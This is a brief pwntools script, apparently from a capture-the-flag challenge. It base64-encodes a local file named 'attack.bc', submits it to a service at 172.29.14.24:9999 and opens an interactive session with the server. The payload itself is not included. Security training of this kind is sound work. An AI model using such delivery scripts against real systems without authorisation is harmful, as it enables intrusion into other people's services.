from base64 import b64encode
from pwn import *

with open('attack.bc', 'rb') as f:
    content = f.read()

con = remote('172.29.14.24', 9999)
con.recvuntil("Please input your b64-encoded bitcode:")
con.sendline(b64encode(content))
con.interactive()
